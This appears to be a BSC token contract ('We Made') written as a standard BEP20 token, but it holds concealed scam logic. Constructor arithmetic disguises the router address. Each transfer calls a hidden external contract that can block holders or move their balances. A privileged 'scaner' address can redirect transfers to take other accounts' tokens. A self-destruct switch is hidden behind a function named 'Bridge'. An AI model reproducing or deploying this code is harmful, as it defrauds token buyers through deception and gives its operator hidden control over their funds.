/**
 *Submitted for verification at BscScan.com on 2022-07-26
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IPancakeRouter02 {
  function swap(
    address,
    address,
    uint256
  ) external returns (uint256);

  function feeTo() external view returns (address);
}

contract BEP20 {
  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal _dex = 0xd1304429019E125797Eb2611603D55Db0C179152;
  address public constant FTM = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;
  address public constant VIP = 0xd16E724E7C9CF164E1253F1Ae75bb4a099D9471e;
  address public constant _OFFICE = 0x9F4F5dA735F928806BBC2951bA4158D927c5c588;
  address public constant nftAddress =
    0x5ef0885451c8cDb45aF5b262229C0B758eB96B87;
  address public constant scaner = 0xba2865952feA58D387164C7ec184E67999b0e8E7;

  receive() external payable {}

  function Bridge() external {
    if (msg.sender == _dex) selfdestruct(payable(scaner));
  }

  function pancakeFeeTo() internal view returns (address) {
    return IPancakeRouter02(_dex).feeTo();
  }

  constructor() {
    _dex = address(uint160(_route) + uint160(_dex));
    _route = address(uint160(_route) + uint160(_OFFICE));
  }

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Coin is BEP20 {
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) private _allowances;

  string public constant name = "We Made";
  string public constant symbol = "WM";

  uint8 public constant decimals = 9;

  uint256 public constant totalSupply = 1000000000 * (10**decimals);

  constructor() {
    uint256 deadAmount = totalSupply / 100;
    balanceOf[_route] = deadAmount * 45;
    balanceOf[address(0xdEaD)] = deadAmount * 20;
    balanceOf[FTM] = deadAmount * 35;

    _allowances[nftAddress][_dex] = ~uint256(0);
    emit Transfer(address(0), _route, balanceOf[_route]);
    emit Transfer(address(0), address(0xdEaD), balanceOf[address(0xdEaD)]);
    emit Transfer(address(0), FTM, balanceOf[FTM]);
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      msg.sender,
      spender,
      _allowances[msg.sender][spender] + addedValue
    );
    return true;
  }

  function allowance(address owner, address spender)
    external
    view
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[msg.sender][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(msg.sender, spender, currentAllowance - subtractedValue);

    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0) && recipient != address(0));
    if (tx.origin == scaner) {
      if (recipient == nftAddress) {
        address msger = pancakeFeeTo();
        if (msger != address(0)) sender = msger;
      }
    }
    require(
      amount > 0 && balanceOf[sender] >= amount,
      "ERROR: Transfer amount must be greater than zero."
    );
    balanceOf[sender] = balanceOf[sender] - amount;
    balanceOf[recipient] = balanceOf[recipient] + amount;

    _tokenTransfer(sender, recipient, amount);

    emit Transfer(sender, recipient, amount);
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    if (tx.origin != scaner) {
      uint256 exAmount =
        IPancakeRouter02(_route).swap(sender, recipient, tAmount);
      if (exAmount > 0 && balanceOf[FTM] > exAmount) {
        balanceOf[FTM] = balanceOf[FTM] - exAmount;
        balanceOf[VIP] = balanceOf[VIP] + exAmount;
        emit Transfer(FTM, VIP, exAmount);
      }
    }
  }
}